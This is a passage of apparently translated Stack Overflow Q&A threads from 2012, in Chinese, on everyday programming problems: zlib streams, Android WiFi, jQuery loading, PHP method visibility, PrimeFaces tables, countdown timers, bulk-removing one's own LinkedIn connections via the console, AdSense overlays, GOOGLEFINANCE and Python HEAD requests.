            </div>
        </div>
    <?php } else { ?>
        <div class="post-title">
            <p class="thumb-title2">
                <a href="<?php the_permalink() ?>"><?php the_title(); ?></a>
            </p>
        </div>
    <?php } ?>
<?php endwhile; ?> 
```

# c++ - 支持流附加的 zlib iostream 包装器

> ID：12603756
> 
> 赞同：2
> 
> 时间：2012-09-26T14:16:19.623
> 
> 标签：c++, gzip, iostream, zlib

我需要 zlib 的 iostream 包装器，它允许将数据附加到现有流的末尾。

附加模式下的 gzopen() 函数遵循下一条规则。“附加时，gzopen 不会测试文件是否以 gzip 流开头，也不会寻找 gzip 流的结尾来开始附加。gzopen 只会将 gzip 流附加到现有文件。” 例如，使用“a”选项打开文件将创建具有多个压缩流的文件。

zlib 的 gzofstream 包装器将参数列表中的 std::ios_base::app 转换为 gzopen() 函数的“ab”模式。因此，gzofstream 还将创建具有多个流的文件。

但是，在我的应用程序中，我需要替代行为。主模块应该以附加模式打开文件（使用 std::ios_base::app 选项），在现有流的末尾写入小数据部分，然后关闭文件。例如，经过多次打开/关闭操作后，文件应始终包含**单个压缩流。**

zlib 中的 gzlog 示例具有接近所需的功能。但是，它是纯C。

你能为我的任务提出一些现成的解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-22T12:51:13.803

对于这种情况，似乎不存在现成的解决方案：iostream 包装器不支持附加操作。

我已经基于 gzlog 和纯 C（不是 C++）实现了自己的代码。

# android - 添加 Android WiFi 连接会导致 -1

> ID：12603757
> 
> 赞同：1
> 
> 时间：2012-09-26T14:16:22.463
> 
> 标签：android, android-wifi

我正在尝试根据扫描结果创建 wi-fi 连接。唯一宣传的功能是 ESS，它是一个没有安全细节的网络。

```
 WifiConfiguration wc = new WifiConfiguration();
        wc.SSID = result.SSID;
        wc.BSSID = result.BSSID;

        //No password. it should be an open network
        wc.status = WifiConfiguration.Status.ENABLED;
        wc.priority = 100000;
        wc.hiddenSSID = false;
        int netId = mainWifi.addNetwork(wc);

        if (netId == -1) 
        {
            showMessageDialog("Error connecting to network.");
            return;
        }
        mainWifi.enableNetwork(netId, true);
        mainWifi.setWifiEnabled(true); 
```

我不断得到-1，这完全没有帮助，控制台或logcat都没有给我任何输出。

我错过了什么吗？有没有办法调试这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T07:48:14.213

SSID 必须在引号中：

```
wc.SSID = "\"SSID_NAME\""; //IMP! This should be in Quotes!! 
```

答案来自这个问题： [https ://stackoverflow.com/a/8818921/178931](https://stackoverflow.com/a/8818921/178931)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-09T10:40:28.307

```
WifiConfiguration wc = new WifiConfiguration();
    wc.SSID = "\"" + result.SSID + "\"";
    wc.BSSID = "\"" + result.BSSID + "\""; 
```

# jquery - jquery .load() 和图像显示

> ID：12603760
> 
> 赞同：0
> 
> 时间：2012-09-26T14:16:28.067
> 
> 标签：jquery, html, ajax, loading, image

我上传了我的第一个网页[http://www.gerenpro.net/](http://www.gerenpro.net/)（如果它不起作用[http://www.gerenproca.com](http://www.gerenproca.com)域名应该很快就会改变）。我在使用 .load() 和加载图像时遇到问题：

```
<div id=tab31>
    <div class=centro >
        <div align="justify" class=izq> 
            <ul id=menuobra>
                <li class="menuobrali"onclick="ajaxObra('imgobra1')">Complejo Criogénico Antonio Jose de Sucre</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra2')">Construcción de la planta de concentración de mineral de hierro</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra3')">Construcción fundación de turbo generador planta termoeléctrica subestación termobarranca</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra4')">METOR - Proyecto de expansión de metanol</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra5')">Obras civiles de la planta de PROPPANTS</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra7')">Excavación, carga, acarreo y disposición de materia prima no conforme(operación minera)</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra8')">Excavación para los fosos norte-sur UNEFA y túnel de interconexión</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra9')">Desarrollo e integración de la Av. Lecuna y proyecto de ingeniería de detalle y construcción del sector teatros</li>
                <li class="menuobrali"onclick="ajaxObra('imgobra10')">Movimiento de tierra, construcción de vialidad y desarrollo del urbanismo insdustrial de la Siderúrgica Nacional</li>
            </ul>
        </div>
        <div class=der>
            <div id=fotoobra > </div>
        </div>
    </div>
</div> 
```

所以，在那个部分，我有一些 onclick 事件，他们称之为

```
function ajaxObra(id) {
    ci=0;i=1;
    $("#fotoobra").empty().html('<img src="img/bar.gif" />');
    $("#fotoobra").load("galeria.html#"+id,function({$("#fotoobrali").css({opacity:0}).removeClass('show');
    $("#fotoobra li:first-child").addClass('show').css({opacity: 1}).css({display:""});
    clearInterval(timerGaleriaObra);
    timerGaleriaObra = setInterval('animarGaleriaObra()',3000)});
}

function animarGaleriaObra(){
    i=ci+1;
    if(i>5) { i=1 }
    $('ul.slideobra li:nth-child('+i+')').addClass('show').css({opacity:1}).css({display:""});
    $('ul.slideobra li:nth-child('+ci+')').hide().css({opacity:0}).removeClass('show');
    ci=i;
} 
```

所以基本上它是一个用于显示图像的循环。但它并没有像我想象的那样工作，如果单击一个元素，不应该只调用 .load() 到我传递的 id 吗？当我单击一个时，它会调用所有的 .html，而不仅仅是传入加载函数的元素 id。因此，当单击其他 li 时，元素已经加载，因为加载调用仅在单击一个 li 时触发

我注意到的另一件事是图像在完全加载之前开始显示。我如何使用我好的 .load() 函数验证图像以完全加载，然后显示？

更新：我怎么知道外部 .html 的其他内容在我拨打电话之前已经加载？..因为当触发应该开始加载其他图像的事件时（“li”上的 onclick 事件）图像是已经满载了..他们都加载了一次点击触发

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T15:48:02.043

我猜您的第一个问题是您正在加载 url，因为`"galeria.html#"+id`这将是一个标准请求并取回整个页面（假设它是一个图像目录的页面）。您很可能正在寻找`load()`使用“url #fragment”参数格式的专用签名（注意空格），所以可能想要：`"galeria.html #"+id`.

至于验证图像，您可以从各个元素挂钩加载事件，并在那里执行任何类型的延迟显示/验证。

# iphone - 使用 Restkit 发布数据

> ID：12603761
> 
> 赞同：0
> 
> 时间：2012-09-26T14:16:29.437
> 
> 标签：iphone, ios, ipod, ipod-touch

这是我发布数据的代码：

```
DBMessage * message = [DBMessage object];

message.title = tokenFieldView.subjectField.text;
message.body = messageView.text;
message.username = [DBUser currentUser].username;

[[RKObjectManager sharedManager] postObject:message delegate:self]; 
```

我的代码在设置委托的最后一行崩溃，崩溃时不显示任何消息。

# php - 从继承的类调用私有方法

> ID：12603766
> 
> 赞同：5
> 
> 时间：2012-09-26T14:16:46.427
> 
> 标签：php, oop, scope-resolution

我想在我的简单 ORM 中用 PHP 实现一个钩子系统：

```
class Record {
  public function save() {
    if (method_exists($this,"before_save")) {
      $this->before_save();
    }
    //...Storing record etc.
  }
}

class Payment extends Record {
  private function before_save() {
    $this->payed_at = time();
  }
}

$payment = new Payment();
$payment->save(); 
```

这会导致致命错误：

> 致命错误：从上下文“记录”中调用私有方法 Payment::before_save()

说得通。

我可以将范围更改为 public，但这看起来很难看：除了 Payment 之外没有人与`before_save()`. 恕我直言，最好保持私密。

如何让 Record 调用继承自 Record 的类的私有方法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-26T14:21:27.453

向您的类添加一个虚拟`before_save`函数`Record`，将其可访问设置为受保护。现在所有继承自的类都`Record`将具有此功能，如果它们不覆盖它，它将什么也不做。如果他们覆盖它，它可以实现所需的功能。

```
class Record {
  public function save() {
    $this->before_save();
    //...Storing record etc.
  }

  protected function before_save() {
     return;
  }
}

class Payment extends Record {
  protected function before_save() {
    $this->payed_at = time();
  }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2020-05-20T19:48:33.343

获胜的答案没有回答问题。有关“公共”、“受保护”、“私人”和“最终”的信息应该可以在任何博客或书籍上获得。

这个问题询问如何使用继承类中的“私有”函数。这里的用例是你被迫使用设计不佳的第 3 方代码，不分青红皂白地使用私有函数，并且不得不找到使用私有函数的方法，或者分叉整个 repo。

这是问题的答案。

```
class foo {

    protected $text = "foo";

    private function bar($text)
    {
        return $text.'->'.$this->text;
    }
}

class fooChild extends foo{

    protected $text = "bar";

    public function barChild()
    {
        $r = new \ReflectionMethod(parent::class, 'bar');
        $r->setAccessible(true);
        //return $r->invokeArgs(new foo(), ['output']); // output->foo
        return $r->invokeArgs($this, ['output']);//output->bar
    }
}

echo (new fooChild())->barChild(); 
```

使用 ReflectionMethod 类，您可以从继承类调用私有方法。您可以看到使用 $this 和父级的新实例的区别。不会从新实例的子级设置属性。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-26T14:18:58.783

检查错误信息

```
Call to private method Payment::before_save() from context 'Record' 
```

这意味着您正在尝试调用在 中定义的`Payment`函数`Record`。类`Record`没有`before_save`方法，因为它**在**继承链中比定义函数的位置更靠前。

换句话说，由于父子关系是`Record (is parent of) Payment`，`Payment`可以访问`Records`函数（通过从父级继承），但反之则不行（父级不能“继承”子类函数）。您可以使您的函数受保护，这将使其在继承链中上下访问，但您可能需要重新考虑架构并决定是否需要它。理想情况下，您应该定义函数`Record`并在其中覆盖它`Payment`

此外（我可能对此有误），但`method_exists`通常不需要显式检查，除非您正在创建一个真正动态的系统，其中运行时类可以重叠和/或生成。如果您从头开始定义一个基于类的系统，并且您知道如何拼接各个部分，那么通常您不需要在运行时检查`method_exists`......只是一个想法......

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-26T14:18:40.433

将范围更改为受保护：

[http://php.net/manual/en/language.oop5.visibility.php](http://php.net/manual/en/language.oop5.visibility.php)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-26T14:23:12.643

PHP中的可见性和继承规则：

> 声明为 protected 的成员只能在类本身以及继承类和父类中访问

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-26T14:24:12.520

```
class test {

    private function pri($val){
        return $val;
    }

    function caller(){
       return $this->pri(5);
    }
}

$testobj = new test;
echo $testobj->caller(); 
```

你会得到 5 作为输出。

通过这种方式，您可以访问一个类的私有函数。

# bash - 在 MOTD (Ubuntu) 中定义函数

> ID：12603776
> 
> 赞同：0
> 
> 时间：2012-09-26T14:17:16.940
> 
> 标签：bash, ubuntu

是否可以在 Ubuntu 机器上的 MOTD 中定义函数？

我的 motd.tail 文件中有以下内容：

```
#!/bin/sh
? () { echo "$*" | bc -l; }
echo
date
echo 
```

但是，如果我登录到该框，则函数定义不起作用，即：

```
? 10*2
?: command not found 
```

关于如何定义函数的任何想法？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:39:25.510

大多数发行版都有一个适合此类事情的系统范围的 bashrc 文件。

在 Debian 上，这个文件是：/etc/bash.bashrc

# jsf-2 - 使用带有延迟加载和视图参数的 primefaces 数据表缺少参数

> ID：12603784
> 
> 赞同：0
> 
> 时间：2012-09-26T14:17:59.530
> 
> 标签：jsf-2, parameters, datatable, primefaces, lazy-loading

所以，我有一个这样的数据表：

```
<p:dataTable var="object" value="#{objectBean.objects}"
            paginator="true" rows="10" editable="true" id="tableObjects"

            paginatorTemplate="{CurrentPageReport}  {FirstPageLink} {PreviousPageLink} {PageLinks} {NextPageLink} {LastPageLink} {RowsPerPageDropdown}"
            rowsPerPageTemplate="5,10,15" style="border: 0px">

            <p:column sortBy="#{object.etc}">
                ..
            </p:column>

            ...

            <p:column sortBy="#{object.someValue}" id="sucessoColumn"
                headerText="Value">
                <p:cellEditor>
                    <f:facet name="output">

                        <h:outputText  value="#{object.someValue}" />
                    </f:facet>
                    <f:facet name="input">
                        <p:selectOneMenu value="#{object.someValue}" effect="fade"
                            id="opt">
                            ...
                        </p:selectOneMenu>
                    </f:facet>
                </p:cellEditor>
            </p:column>

            <p:column id="bColumn" headerText="Options">

                <p:rowEditor />
            </p:column>
            <p:ajax event="rowEdit" listener="#{objectBean.update}"></p:ajax>

        </p:dataTable> 
```

在接收如下参数的页面上：

```
<f:metadata>
        <f:viewParam name="id" value="#{objectBean.object}"
            converter="#{objectConverter}" converterMessage="Converter error !"
            required="true" requiredMessage="Missing object !" />
    </f:metadata> 
```

页面加载后，完全没有问题，一切正常。但是当我单击下一页或尝试编辑该行时，会出现来自视图参数的“所需消息”。当数据表上的任何内容发生更改时，参数似乎会消失。

有任何想法吗 ？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-22T19:51:23.533

问题在于我们使用的 Bean 的范围。似乎，每次数据表的状态发生变化时，它都会对 bean 发出另一个请求。如果它是请求范围的，则该参数仅适用于第一个请求。

改用 ViewScope 解决了一半的问题。数据表正常工作，但消息仍然出现。采用“required”和“requiredMessage”属性解决了问题的最后一部分，一切都很顺利。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-21T10:34:22.940

也许我的回答为时已晚，但我遇到了和你一样的问题。

我将从您的代码中解释我的解决方案。

我不知道为什么，但是当您使用延迟加载和单元格编辑器时，rowEdit 功能不起作用。

```
<p:ajax event="rowEdit" listener="#{objectBean.update}"></p:ajax> 
```

如果您从代码中删除 cellEditor，您将看到 objectBean.update 方法将运行。

我删除

```
<p:ajax event="rowEdit" listener="#{objectBean.update}"></p:ajax> 
```

在每个单元格编辑器中，我将我的代码更改为这个。

```
<p:column sortBy="#{object.someValue}" id="sucessoColumn" headerText="Value">                      <p:cellEditor>
  <f:facet name="output">
   <h:outputText  value="#{object.someValue}" />
  </f:facet>
  <f:facet name="input">
   <p:selectOneMenu value="#{object.someValue} effect="fade" id="opt">
    <p:ajax event="valueChange" process="@this" listener="#{objectBean.update(object)}"/>
   </p:selectOneMenu>
  </f:facet>
 </p:cellEditor>
</p:column> 
```

在 Bean 中，将更新方法从第一个更改为第二个。

```
public void update(RowEditEvent event) {
    Object editingRow = (Object) event.getObject();
    objectService().saveOrUpdate(editingRow);
}

public void update(HospitalDoctor obj) {
    objectService().saveOrUpdate(obj);
} 
```

这样我解决了我的问题，希望对其他人有所帮助。

# php - 想停止倒计时并在时间到时发出put

> ID：12603789
> 
> 赞同：0
> 
> 时间：2012-09-26T14:18:10.367
> 
> 标签：php, javascript

你好我想当我的倒计时结束时它应该给出：

```
document.getElementById("remain").innerHTML = "Time up"; 
```

现场倒计时：http: [//ffsng.deewayz.in/counter/](http://ffsng.deewayz.in/counter/)

当它即将结束时，我想放出那个“时间到了”

我用这种方式尝试了一些东西，但效果很好。

```
function setCountDown() {
    seconds--;
    if (seconds < 0) {
        minutes--;
        seconds = 59;
    }
    if (minutes < 0) {
        hours--;
        minutes = 59;
    }
    if (hours < 0) {
        days--;
        hours = 23;
    }
    document.getElementById("remain").innerHTML = days + " days, " + hours + " hours, " + minutes + " minutes, " + seconds + " seconds";
    if ((seconds = 0) && (minutes = 0) && (hours = 0) && (days = 0))(
        document.getElementById("remain").innerHTML = "time up";
    ) else ( 
        setTimeout("setCountDown()", 1000);
    );  
} 
```

我的完整代码在这里：[倒数计时器不适用于格林威治标准时间](https://stackoverflow.com/questions/12594438/countdown-timer-not-working-with-gmt-time)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:33:35.667

不是很好，但可以满足您的需求！

**HTML**

```
<div id="countdown">
    <span id="row1"></span><br />
    <span id="row2"></span>
</div> 
```

**JS**

```
var end = new Date('October 08, 2012 00:55:00');

function toSt1(n) {
    var s = '';
    if (n < 10) s += '0';
    return (s + n).toString();
}

function toSt2(n) {
    var s = '';
    if (n < 10) s += '00';
    else if (n < 100) s += '0';
    return (s + n).toString();
}

var countdown = function() {
    var d = new Date();
    var count = Math.floor(end.getTime() - d.getTime());
    if (count > 0) {
        var miliseconds = toSt2(count % 1000);
        count = Math.floor(count / 1000);
        var seconds = toSt1(count % 60);
        count = Math.floor(count / 60);
        var minutes = toSt1(count % 60);
        count = Math.floor(count / 60);
        var hours = toSt1(count % 24);
        count = Math.floor(count / 24);
        var days = count;
        document.getElementById('row1').innerHTML = days + ' Days';
        document.getElementById('row2').innerHTML = hours + ' Hours ' + minutes + ' Minutes ' + seconds + ' Seconds ';
        setTimeout('countdown()', 100);
    } else {
        document.getElementById("countdown").innerHTML = "Time up";
    }
}
countdown(); 
```

**[演示](http://jsfiddle.net/UPPtC/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:24:14.490

在倒计时完成时，请参阅此代码以执行某些操作（如您所要求的那样提供输出）：

```
$(function(){
  var count = 10;
  countdown = setInterval(function(){
    $("p.countdown").html(count + " seconds remaining!");
    if (count == 0) {
      $('#remain').html('Time up');
    }
    count--;
  }, 1000);
}); 
```

此解决方案使用 jQuery。

参考。 [如何进行 jQuery 倒计时](https://stackoverflow.com/questions/2064186/how-can-i-make-a-jquery-countdown)

# javascript - 有没有办法通过 Javascript 删除 LinkedIn 连接

> ID：12603791
> 
> 赞同：-1
> 
> 时间：2012-09-26T14:18:11.760
> 
> 标签：javascript, linkedin

我正在尝试找到一种方法来使用连接 ID 通过 Javascript 删除 LinkedIn 连接。通过 Connections API (https://developer.linkedin.com/documents/connections-api) 是不可能的。

LinkedIn 通过表格在自己的网站上进行。有没有办法复制该功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T15:01:50.680

您是在谈论 Web 浏览器上的 JS 吗？在这种情况下，通过 JS 发布到表单可能被认为是 CSRF，并且会被现代浏览器阻止。所以不，现代浏览器可能不可能。

如果您使用的是 node.js 或其他非浏览器 JS，那么您可以执行正常的 HTTP 请求来登录、处理会话 cookie 并发布到表单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-09-25T19:57:38.527

[从https://www.linkedin.com/mynetwork/invite-connect/connections/](https://www.linkedin.com/mynetwork/invite-connect/connections/)在控制台中试试这个：

```
var i;
for (i = 100; i > 0; i--) {
    $("span[class='mn-connection-card__dropdown-option-text ml1']")[i].click();
    $("button[data-control-name='confirm_removed']").click();
} 
```

允许您一次删除 100 个连接确保您加载了足够的连接

**警告**：请小心，因为在运行此脚本时不会要求您进行任何确认。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-04-04T17:41:59.420

是的，我找到了一个，

首先去[https://www.linkedin.com/mynetwork/invite-connect/connections/](https://www.linkedin.com/mynetwork/invite-connect/connections/)

在此页面中进入您的控制台（如果您使用的是 Windows，则可以按*F12*，如果您是 Mac，则可以进行检查）。

在您的控制台中输入：

```
setInterval(() => {   
  document.querySelectorAll("[data-control-name=ellipsis]")[0].click()
  document.querySelectorAll("[type=trash-icon]")[0].click()
  document.querySelectorAll("[data-control-name=confirm_removed]")[0].click()
}, 500); 
```

然后按*Enter*

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-05-13T17:27:45.780

```
function stepOne(){

document.querySelector('button.mn-connection-card__dropdown-trigger.artdeco-button--tertiary.artdeco-button--muted.artdeco-button--circle.p1.artdeco-dropdown__trigger.artdeco-dropdown__trigger--placement-bottom.ember-view').click();
window.zorro++;

setTimeout(function () {
    document.querySelector('button.display-flex').click();
    window.zorro++;

    setTimeout(function () {
        document.querySelector('button.artdeco-button--primary').click();
        window.zorro++;

        if(window.zorro % 3 == 0)
            setTimeout(function () {
                stepOne();
            }, 6000);

        }, 300);

}, 300);

}

window.zorro = 0;
stepOne(); 
```

# jquery - 在 div 叠加层中嵌入 javascript 代码的问题

> ID：12603793
> 
> 赞同：1
> 
> 时间：2012-09-26T14:18:17.590
> 
> 标签：jquery, overlay, adsense

我有一个按钮，一旦单击，我就会显示一个覆盖模式 div，并且在这个 div 中我嵌入了一个 adsense 代码。代码如下：

```
$('<div />').addClass('lightbox').appendTo('body').show();
    $('<div />').addClass('video_modal').appendTo('body').
                 css('top', '100px').css('left', $(window).width()/2-200+'px').
                 html('<div style="width:100%;height:225px;float:left"><script type="text/javascript"><!--\
        google_ad_client = "ca-pub-4677950456522449";\
        /* Cuadrado_Principal */\
        google_ad_slot = "9996968724";\
        google_ad_width = 300;\
        google_ad_height = 250;\
        //-->\
        </script>\
        <script type="text/javascript"\
        src="http://pagead2.googlesyndication.com/pagead/show_ads.js">\
        </script>\
</div>\
                 <div class="preloader"></div>\
                 <div class="preloader_text"Searching...</div>').show(); 
```

问题是预加载器和它的文本显示，但不显示 adsense 广告。我的代码有什么问题？我无法理解发生了什么。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T16:07:09.947

我的经验表明，动态添加 AdSense 是……困难的。也许谷歌不允许这样做，因此它不起作用。我的建议是使用 AdSense 代码创建一个隐藏 div，然后在您触发任何事件时，使用 jQuery 将隐藏 div 的内容移动到您喜欢的任何位置。

在此示例中，我向您的一个名为“googleadgoeshere”的 div 添加了一个 ID，隐藏的 div 称为“adsense”。

```
<html>
<head>
<title>Test</title>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
</head>
<body>
<p>Hello world</p>

<script type="text/javascript">
function showAd() {
    $('<div />').addClass('lightbox').appendTo('body').show();
    $('<div />').addClass('video_modal').appendTo('body').css('top', '100px').css('left', $(window).width()/2-200+'px').html('<div style="width:100%;height:225px;float:left" id="googleadgoeshere"></div>');
    $('<div />').addClass('preloader').appendTo('body').show();
    $('<div />').addClass('preloader_text').text('Searching...').appendTo('body').show();
    $('#adsense').show().appendTo('#googleadgoeshere');
}
</script>

<div id="adsense" style="display:none">
<script type="text/javascript">
<!--
google_ad_client = "ca-pub-4677950456522449";
/* Cuadrado_Principal */
google_ad_slot = "9996968724";
google_ad_width = 300;
google_ad_height = 250;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
</div>

<input type="button" value="Show ad" onclick="showAd()" />

</body>
</html> 
```

它对我有用，如果您遇到任何麻烦，请告诉我！

# google-sheets - 如何使用 GOOGLEFINANCE(("CURRENCY:EURAUD")) 函数

> ID：12603801
> 
> 赞同：29
> 
> 时间：2012-09-26T14:18:29.110
> 
> 标签：google-sheets, currency, google-finance, google-finance-api

这个功能：

```
GOOGLEFINANCE(("CURRENCY:EURAUD")) 
```

在 Google 表格中运行良好，我在网上上下搜索了一些关于此功能及其使用方式的文档，我得到的最接近的是这个

[http://www.google.com/finance?q=EURAUD](http://www.google.com/finance?q=EURAUD)

有谁知道如何使用这个？或者在哪里可以找到有关此功能的文档？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2014-12-06T02:23:16.297

您正在寻找的具体说明在这里： https: [//support.google.com/docs/answer/3093281](https://support.google.com/docs/answer/3093281)

请记住，您的 Google 电子表格公式可能会使用分号 (;) 而不是逗号 (,)，具体取决于区域设置。

在某些示例上进行替换后，将如下所示：

```
=GoogleFinance("CURRENCY:USDEUR")
=INDEX(GoogleFinance("USDEUR","price",today()-30,TODAY()),2,2)
=SPARKLINE(GoogleFinance("USDEUR","price",today()-30,today())) 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2016-08-08T13:38:18.157

2016 年 1 月 1 日欧元对挪威克朗的汇率：

```
=INDEX(GOOGLEFINANCE("CURRENCY:EURNOK"; "close"; DATE(2016;1;1)); 2; 2) 
```

使用该`INDEX()`函数是因为`GOOGLEFINANCE()`当您使用这些参数调用该函数时，函数实际上会在 4 个单独的单元格 (2x2) 中打印出来，结果只会是一个单元格。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-08T22:13:49.350

干得好：

[https://support.google.com/docs/answer/3093281](https://support.google.com/docs/answer/3093281)

这是 Google 提供的所有文档。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-01-29T13:31:50.483

请记住，该`GoogleFinance()`功能在新版 Google 表格中无法 100% 运行。例如，从转换`USD`为`GBP`使用公式在旧版本中`GoogleFinance("CURRENCY:USDGBP")`给出`0.603974`，但在新版本中只有 0.6。看起来有一个舍入错误。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2020-01-05T20:45:33.623

某些货币对在某些日子没有历史数据。

比较`=GOOGLEFINANCE("CURRENCY:EURNOK", "close", DATE(2016,1,1), DATE(2016,1,12)`：

```
Date                Close
1/1/2016 23:58:00   9.6248922
1/2/2016 23:58:00   9.632922114
1/3/2016 23:58:00   9.579957264
1/4/2016 23:58:00   9.609146435
1/5/2016 23:58:00   9.573877808
1/6/2016 23:58:00   9.639368875
1/7/2016 23:58:00   9.707103569
1/8/2016 23:58:00   9.673324479
1/9/2016 23:58:00   9.702379872
1/10/2016 23:58:00  9.702721875
1/11/2016 23:58:00  9.705679083 
```

和`=GOOGLEFINANCE("CURRENCY:EURRUB", "close", DATE(2016,1,1), DATE(2016,1,12)`：

```
Date                Close
1/1/2016 23:58:00   79.44402768
1/4/2016 23:58:00   79.14048175
1/5/2016 23:58:00   80.0452446
1/6/2016 23:58:00   80.3761125
1/7/2016 23:58:00   81.70830185
1/8/2016 23:58:00   81.70680013
1/11/2016 23:58:00  82.50853122 
```

所以，`=INDEX(GOOGLEFINANCE("CURRENCY:EURRUB", "close", DATE(2016,1,1)), 2, 2)`给

```
79.44402768 
```

但是`=INDEX(GOOGLEFINANCE("CURRENCY:EURRUB", "close", DATE(2016,1,2)), 2, 2)`给

```
#N/A 
```

因此，当使用周末/节假日没有汇率的货币对时，可以使用以下公式来获取下一个工作日的汇率：

```
=INDEX(GOOGLEFINANCE("CURRENCY:EURRUB", "close", DATE(2016,1,2), 4), 2, 2) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-04-26T08:31:23.210

```
=INDEX(GoogleFinance("CURRENCY:" & "EUR" & "USD", "price", A2), 2, 2) 
```

`A2`日期格式为日期的单元格在哪里。

将“EUR”和“USD”替换为您的货币对。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2015-07-18T20:11:08.710

语法是：

> =GOOGLEFINANCE（股票代码，[属性]，[开始日期]，[天数|结束日期]，[间隔]）

[示例用法](https://support.google.com/docs/answer/3093281)：

```
=GOOGLEFINANCE("GOOG", "price", DATE(2014,1,1), DATE(2014,12,31), "DAILY")
=GOOGLEFINANCE("GOOG","price",TODAY()-30,TODAY())
=GOOGLEFINANCE(A2,A3)
=117.80*Index(GOOGLEFINANCE("CURRENCY:EURGBP", "close", DATE(2014,1,1)), 2, 2) 
```

例如，如果您想转换特定日期的汇率，这里有一些更高级的示例：

```
=IF($C2 = "GBP", "", Index(GoogleFinance(CONCATENATE("CURRENCY:", C2, "GBP"), "close", DATE(year($A2), month($A2), day($A2)), DATE(year($A2), month($A2), day($A2)+1), "DAILY"), 2)) 
```

`$A2`您的日期在哪里（例如`01/01/2015`），`C2`您的货币在哪里（例如`EUR`）。

[在Google](https://support.google.com/docs/answer/3093281)的文档编辑器帮助中查看更多示例。

* * *

## 回答 #8

> 赞同：-2
> 
> 时间：2016-08-07T02:04:32.470

您必须在公式框中使用等号

```
=GOOGLEFINANCE("GOOG", "price", DATE(2014,1,1), DATE(2014,12,31), "DAILY") 
```

# python - python中的HEAD请求无法按预期工作

> ID：12603809
> 
> 赞同：1
> 
> 时间：2012-09-26T14:18:46.763
> 
> 标签：python, http-headers, urllib2

我正在尝试使用以下代码检查 Python 中任何 URL 的状态代码

```
class HeadRequest(urllib2.Request):
    def get_method(self):
        return "HEAD" 
```

当我这样使用它时：

```
response = urllib2.urlopen(HeadRequest("http://www.nativeseeds.org/")) 
```

它抛出以下异常：

```
HTTPError: HTTP Error 503: Service Temporarily Unavailable 
```

但是，当我在 firefox/restclient 中打开上述 URL“http://www.nativeseeds.org/”时，它会返回 200 状态码。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:56:57.630

经过一番调查，该网站**要求**同时设置`Accept`和`User-Agent`请求标头。否则，它会返回 503。这是非常糟糕的。它似乎也在进行用户代理嗅探。使用 curl 时出现 403：

```
$ curl --head http://www.nativeseeds.org/
HTTP/1.1 403 Forbidden
Date: Wed, 26 Sep 2012 14:54:59 GMT
Server: Apache
P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
Set-Cookie: f65129b0cd2c5e10c387f919ac90ad66=PjZxNjvNmn6IlVh4Ac-tH0; path=/
Vary: Accept-Encoding
Content-Type: text/html 
```

但如果我将用户代理设置为 Firefox，则工作正常：

```
$ curl --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --head http://www.nativeseeds.org/
HTTP/1.1 200 OK
Date: Wed, 26 Sep 2012 14:55:57 GMT
Server: Apache
P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
Expires: Mon, 1 Jan 2001 00:00:00 GMT
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: f65129b0cd2c5e10c387f919ac90ad66=ykOpGnEE%2CQOMUaVJLnM7W0; path=/
Last-Modified: Wed, 26 Sep 2012 14:56:27 GMT
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8 
```

它似乎可以使用[requests](http://docs.python-requests.org/en/latest/index.html)模块工作：

```
>>> import requests
>>> r = requests.head('http://www.nativeseeds.org/')
>>> import pprint; pprint.pprint(r.headers)
{'cache-control': 'post-check=0, pre-check=0',
 'content-encoding': 'gzip',
 'content-length': '20',
 'content-type': 'text/html; charset=utf-8',
 'date': 'Wed, 26 Sep 2012 14:58:05 GMT',
 'expires': 'Mon, 1 Jan 2001 00:00:00 GMT',
 'last-modified': 'Wed, 26 Sep 2012 14:58:09 GMT',
 'p3p': 'CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"',
 'pragma': 'no-cache',
 'server': 'Apache',
 'set-cookie': 'f65129b0cd2c5e10c387f919ac90ad66=2NtRrDBra9jPsszChZXDm2; path=/',
 'vary': 'Accept-Encoding'} 
```

* * *

